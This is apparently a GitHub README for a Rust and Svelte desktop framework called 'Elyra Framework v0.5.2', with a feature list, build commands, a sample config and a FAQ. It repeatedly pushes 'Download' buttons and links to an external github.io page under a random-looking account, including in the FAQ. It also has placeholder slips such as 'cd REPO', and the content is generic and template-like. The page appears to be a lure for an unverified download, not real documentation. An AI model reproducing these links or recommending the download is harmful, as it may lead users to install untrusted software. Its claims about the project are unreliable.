# Elyra Framework v0.5.2 - Desktop Application Framework 2026

> **Elyra Framework is a Rust and Svelte toolkit for creating compiled desktop software on Windows, macOS, and Linux. Version 0.5.2 provides typed MessagePack IPC and a Laravel-inspired application architecture.**

[![Platform](https://img.shields.io/badge/Platform-Windows%2C%20macOS%2C%20Linux-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.5.2-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/calebdavisrsfx8099/elyra-app-framework?style=flat-square)](https://github.com/calebdavisrsfx8099/elyra-app-framework)

---

<p align="center">
  <a href="https://calebdavisrsfx8099.github.io/elyra-app-framework/">
    <img src="https://img.shields.io/badge/Download-Elyra%20Framework%20Latest-brightgreen?style=for-the-badge" alt="Download Elyra Framework">
  </a>
</p>

> **[Download Elyra Framework v0.5.2](https://calebdavisrsfx8099.github.io/elyra-app-framework/)**

---

[Download Latest Build](https://calebdavisrsfx8099.github.io/elyra-app-framework/)

---

## Overview

Elyra Framework combines a Rust backend with a Svelte frontend to produce native desktop binaries. The frontend runs through a WebView, while a typed MessagePack IPC layer provides structured communication between the application interface and backend code.

Its architecture is intended for teams that want a clear application organization model alongside native desktop functionality. Inspired by Laravel, Elyra includes providers, middleware, dependency containers, facades, and asynchronous command processing. It also offers integrations for windows, system trays, databases, notifications, and additional desktop capabilities.

---

## Core Capabilities

- Package Rust and Svelte applications as desktop binaries.
- Use typed MessagePack IPC to connect frontend code with backend services.
- Structure execution through middleware pipelines and dependency containers.
- Run asynchronous commands and manage frontend communication with an event bus.
- Produce TypeScript definitions from application interfaces.
- Create applications with multiple windows and system tray functionality.
- Work with native dialogs, the clipboard, notifications, and shell features.
- Connect to SQLite, MySQL, and PostgreSQL databases.
- Build AI workflows with agents, tools, structured output, and embeddings.
- Use cache, storage, and queue facades.
- Verify update packages with Ed25519 signatures.

---

## Getting Started

First clone the repository and move into its directory:

```bash
git clone https://github.com/calebdavisrsfx8099/elyra-app-framework.git
cd REPO
```

After installing the dependencies used by the Rust and Svelte components, build the project during development with:

```bash
cargo build
```

To create an optimized production artifact, use the release profile:

```bash
cargo build --release
```

The compiled desktop executable is available in the generated build output for the relevant operating system.

---

## Typical Workflow

An Elyra application commonly follows this sequence:

1. Create the Rust services, providers, commands, and middleware.
2. Publish typed commands through the MessagePack IPC layer.
3. Implement the Svelte frontend using the generated TypeScript definitions.
4. Configure windows, tray operations, events, dialogs, and notifications as required.
5. Add storage or database integrations where the application needs them.
6. Compile the completed project as a native desktop application.

For a basic development run, use:

```bash
cargo check
cargo build
cargo run
```

The application entry point can be used to test the frontend, IPC commands, window behavior, and native integrations as one system.

---

## Project Configuration

Store framework configuration with the application source so it remains visible alongside providers, commands, middleware, and frontend implementation. For example:

```toml
[application]
name = "example-desktop-app"

[frontend]
framework = "svelte"

[ipc]
format = "messagepack"

[database]
driver = "sqlite"
```

Replace the example application and database values with those used by the project. Environment-specific credentials and connection settings should remain outside committed source files when appropriate.

---

## System Requirements

- Windows, macOS, or Linux.
- A Rust toolchain that can compile the application.
- Node.js and the package tooling required by the Svelte frontend.
- WebView support provided by the target desktop operating system.
- Enough storage for Rust dependencies, frontend packages, and build artifacts.
- A database service when using MySQL or PostgreSQL; SQLite is available for local database storage.

---

## Frequently Asked Questions

### What kinds of applications can Elyra Framework build?

Elyra Framework is designed for compiled desktop applications that use Rust for the backend and Svelte for the frontend.

### Which platforms can run Elyra applications?

Windows, macOS, and Linux are supported targets.

### What connects the Svelte frontend to Rust?

The frontend and backend communicate through a typed MessagePack IPC bridge, which exposes structured access to Rust commands.

### How is application logic organized?

Keep providers, middleware, dependency bindings, commands, and related configuration in the project source structure. Svelte-specific behavior belongs in the frontend application.

### Does the framework include database support?

Yes. Available database connections include SQLite, MySQL, and PostgreSQL.

### What should I check when a build fails?

Verify that the Rust toolchain and frontend dependencies are available, then run `cargo check` to locate Rust-side problems before attempting another build. For frontend failures, review package installation and the Svelte build output.

### How does update verification work?

Update packages are checked using Ed25519 verification. Use the project's release and deployment configuration when producing update artifacts.

### Where are newer builds available?

Check the [Download Latest Build](https://calebdavisrsfx8099.github.io/elyra-app-framework/) link for the currently available release package.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
